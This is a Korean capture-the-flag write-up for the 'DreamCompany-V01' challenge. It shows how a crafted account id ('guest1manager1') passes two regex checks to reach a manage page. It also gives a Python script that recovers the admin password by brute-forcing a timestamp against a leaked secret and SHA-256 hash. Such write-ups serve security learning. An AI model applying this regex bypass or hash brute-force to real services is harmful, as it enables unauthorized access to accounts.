## DreamCompany-V01
---

세션을 추가하려면 그리고 JWt 토큰을 생성하려면 계정을 만들어야 함.

이 때 세션을 추가하려면 id가 ```guest[0-9]*```로 시작해야 함.

그리고 manage 페이지에 접속하려면 검증을 거쳐서 통과해야 하는데 checkGroup 함수가 true가 되어야 함.

이 함수에서는 id가 ```manager[0-9]*```이어야 함.

따라서 id가 ```guest[0-9]*manager[0-9]*\w```이면 두 정규표현식을 만족하게 됨. -> ```guest1manager1```

이걸로 계정을 생성한 뒤 manage 페이지에 접속할 수 있음.

<br>

manage 페이지에 접속하면 admin hash와 admin log에서 시간과 secret key 값을 확인할 수 있다.

어드민 비밀번호는 시간 값을 브루트포싱해서 찾을 수 있는데, 여기서 시간은 코드에서 ```getTime()``` 함수의 리턴 값인데 예를 들어, 1초라면 01로 나오는게 아니라 1로 나온다는 것이다.

즉, 12시 14분 1초 100밀리초라면 ```121401100```이 아니라 ```12141100```이라는 것이다.

따라서 이를 토대로 코드를 짜서 비밀번호를 얻는다.

<br>

```python
import hashlib

cipher = 'shs2848divv8ru4uwau3u48sdifjsigjirjgls8bvcawe214126934'
admin_hash = '4b3ae304ded8f334e67ebc87a5a41f6b9777da66cf429bc652fb7f925983abff'

hour = '14'
minute = 12
seconds = 0
milliseconds = 0

while (minute != 13):
    milliseconds += 1
    if (milliseconds == 1000):
        milliseconds = 0
        seconds += 1

    if (seconds == 60):
        seconds = 0
        minute += 1
    time = hour + str(minute) + str(seconds) + str(milliseconds)
    check = hashlib.sha256((cipher + time).encode()).hexdigest()
    print("M, s, m : ", minute, seconds, milliseconds)
    if (check == admin_hash):
        print("PW : ", cipher + time)
        break
```

<br>
